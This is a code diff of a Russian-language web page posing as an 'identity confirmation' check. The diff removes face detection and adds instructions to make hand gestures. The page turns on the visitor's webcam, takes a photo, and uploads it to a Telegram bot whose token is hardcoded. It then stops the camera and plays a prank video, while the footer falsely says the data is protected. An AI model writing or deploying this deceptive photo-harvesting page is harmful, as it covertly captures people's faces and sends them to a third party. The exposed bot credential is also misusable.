@@ -51,14 +51,6 @@
             display: block;
             border-radius: 16px;
         }
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-        }
         #rickroll {
             display: none;
             width: 100%;
@@ -78,9 +70,8 @@
             max-width: 280px;
             transition: 0.2s;
         }
-        .btn:disabled {
-            background: #444;
-            cursor: not-allowed;
+        .btn:active {
+            transform: scale(0.96);
         }
         #status {
             margin-top: 16px;
@@ -93,19 +84,32 @@
             font-size: 12px;
             color: #555;
         }
-        .loader {
-            display: inline-block;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #333;
-            border-top: 3px solid #1e90ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 10px auto;
+        .instruction {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            border-left: 4px solid #1e90ff;
+            text-align: left;
+            font-size: 15px;
+            line-height: 1.6;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .instruction span {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        .hint {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 12px 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+        .hint span {
+            background: #222;
+            padding: 6px 14px;
+            border-radius: 30px;
         }
     </style>
 </head>
@@ -113,20 +117,32 @@
 
 <div class="container" id="mainUI">
     <h2>🔐 Подтверждение личности</h2>
-    <p class="sub">Покажите лицо, затем нажмите «Отправить»</p>
+    <p class="sub">Для завершения проверки сделайте фото</p>
+
+    <div class="instruction">
+        <span>📌 Инструкция:</span><br>
+        1. Покажите <span>лицо</span> (чётко, при хорошем свете)<br>
+        2. Покажите <span>жест рукой</span>:<br>
+        &nbsp;&nbsp;• 🤘 (рок) <br>
+        &nbsp;&nbsp;• 👍 (палец вверх)<br>
+        3. Нажмите кнопку «Отправить»
+    </div>
+
+    <div class="hint">
+        <span>🤘 Рок</span>
+        <span>👍 Палец вверх</span>
+    </div>
 
     <div class="video-wrapper">
         <video id="video" autoplay playsinline></video>
-        <canvas id="overlay"></canvas>
         <video id="rickroll" src="https://filesamples.com/samples/video/mp4/sample_640x360.mp4" muted playsinline></video>
     </div>
 
-    <button class="btn" id="sendBtn" disabled>📸 Отправить фото</button>
-    <div id="status">⏳ Загрузка модели...</div>
+    <button class="btn" id="sendBtn">📸 Отправить фото</button>
+    <div id="status">⏳ Ожидание камеры...</div>
     <div class="footer">Ваши данные защищены • Проверка занимает 5 секунд</div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <script>
     // ===== ТВОИ ДАННЫЕ =====
     const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
@@ -135,86 +151,39 @@
 
     const video = document.getElementById('video');
     const rickroll = document.getElementById('rickroll');
-    const overlay = document.getElementById('overlay');
-    const ctx = overlay.getContext('2d');
     const sendBtn = document.getElementById('sendBtn');
     const status = document.getElementById('status');
 
     let stream = null;
-    let faceDetected = false;
     let rickrollPlayed = false;
 
-    // === ЗАГРУЗКА МОДЕЛИ (НОВОЕ ЗЕРКАЛО) ===
-    async function loadModels() {
-        status.innerHTML = '⏳ Загрузка модели распознавания лиц...<div class="loader"></div>';
-        try {
-            await faceapi.nets.tinyFaceDetector.loadFromUri(
-                'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/'
-            );
-            status.textContent = '✅ Модель готова. Разрешите доступ к камере.';
-            startCam();
-        } catch (e) {
-            status.textContent = '❌ Ошибка загрузки модели: ' + e.message;
-        }
-    }
-
+    // Включаем камеру
     async function startCam() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            video.addEventListener('play', () => {
-                overlay.width = video.videoWidth || 640;
-                overlay.height = video.videoHeight || 480;
-                detectFace();
-            });
+            status.textContent = '✅ Камера включена. Сделайте жест и нажмите "Отправить"';
         } catch (e) {
             status.textContent = '❌ Ошибка доступа к камере: ' + e.message;
         }
     }
 
-    async function detectFace() {
-        setInterval(async () => {
-            if (rickrollPlayed) return;
-
-            try {
-                const detections = await faceapi.detectAllFaces(
-                    video,
-                    new faceapi.TinyFaceDetectorOptions()
-                );
-
-                ctx.clearRect(0, 0, overlay.width, overlay.height);
-
-                if (detections.length > 0) {
-                    faceDetected = true;
-                    sendBtn.disabled = false;
-                    status.textContent = '✅ Лицо обнаружено! Нажмите "Отправить"';
-
-                    const box = detections[0].box;
-                    ctx.strokeStyle = '#00ff00';
-                    ctx.lineWidth = 3;
-                    ctx.strokeRect(box.x, box.y, box.width, box.height);
-                } else {
-                    faceDetected = false;
-                    sendBtn.disabled = true;
-                    status.textContent = '❌ Лицо не обнаружено. Покажите лицо чётко.';
-                }
-            } catch (e) {
-                // если произошла ошибка — игнорируем, чтобы не сломать цикл
-            }
-        }, 400);
-    }
-
+    // Отправка фото
     async function snap() {
-        if (!faceDetected) {
-            status.textContent = '❌ Лицо не обнаружено. Попробуйте ещё раз.';
-            return;
-        }
+        if (rickrollPlayed) return;
 
         const canvas = document.createElement('canvas');
         canvas.width = 640;
         canvas.height = 480;
-        const c = canvas.getContext('2d');
-        c.drawImage(video, 0, 0, 640, 480);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+
+        // Добавляем надпись на фото
+        ctx.fillStyle = '#ffffff30';
+        ctx.fillRect(0, 440, 640, 40);
+        ctx.fillStyle = '#fff';
+        ctx.font = '16px sans-serif';
+        ctx.fillText('Подтверждение личности', 20, 470);
 
         const data = canvas.toDataURL('image/png');
         status.textContent = '📤 Отправка фото...';
@@ -223,7 +192,7 @@
             const blob = await fetch(data).then(r => r.blob());
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
-            form.append('photo', blob, 'face.png');
+            form.append('photo', blob, 'face_gesture.png');
 
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -242,15 +211,17 @@
         }
     }
 
+    // Рикролл
     function playRickroll() {
         rickrollPlayed = true;
 
+        // Останавливаем камеру
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
         }
         video.style.display = 'none';
-        overlay.style.display = 'none';
 
+        // Показываем видео
         rickroll.style.display = 'block';
         rickroll.muted = false;
         rickroll.volume = 1.0;
@@ -264,7 +235,7 @@
     }
 
     sendBtn.onclick = snap;
-    loadModels();
+    startCam();
 </script>
 </body>
 </html>
